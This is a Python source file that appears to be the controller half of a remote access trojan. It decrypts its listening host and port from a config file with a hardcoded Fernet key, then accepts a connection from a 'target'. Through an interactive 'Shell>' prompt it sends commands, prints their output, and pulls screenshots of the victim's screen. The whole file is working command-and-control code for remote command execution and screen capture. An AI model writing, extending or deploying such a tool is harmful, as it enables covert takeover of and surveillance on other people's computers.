import socket
from cryptography.fernet import Fernet
import json

KEY = b'FtABmI-psWsyRuNo-ZqCGFjhdhUlB6RcNxORcdKcN7Q='
cipher = Fernet(KEY)

def load_config():
    try:
        with open('config.json', 'r') as file:
            data = json.load(file)
        host = cipher.decrypt(data['host'].encode()).decode()
        port = int(cipher.decrypt(data['port'].encode()).decode())
        return host, port
    except Exception as e:
        print(f"Config error: {e}")
        exit(1)

def receive_file(conn, save_path):
    try:
        # Get size and tell target we are ready
        filesize_raw = conn.recv(1024).decode()
        filesize = int(filesize_raw)
        conn.send(b"READY")
        
        with open(save_path, "wb") as f:
            remaining = filesize
            while remaining > 0:
                chunk_size = 4096 if remaining > 4096 else remaining
                data = conn.recv(chunk_size)
                if not data: 
                    break
                f.write(data)
                remaining -= len(data)
        
        print(f"[*] Success: Screenshot saved as {save_path}")
    except Exception as e:
        print(f"[*] Error receiving file: {e}")

def start_server():
    # Load config first
    host, port = load_config()
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(1)
    print(f"[*] Listening on {host}:{port}...")
    
    conn, addr = server.accept()
    print(f"[*] Connected to {addr}")
    
    with conn:
        while True:
            cmd = input("Shell> ").strip().lower()
            if not cmd: 
                continue
            
            conn.send(cmd.encode())
            
            if cmd == 'exit': 
                break
            
            if cmd == "screenshot":
                receive_file(conn, "captured_screen.png")
            else:
                # Only receive text response for non-screenshot commands
                result = conn.recv(4096).decode()
                print(result)
    
    server.close()

if __name__ == "__main__":
    start_server()
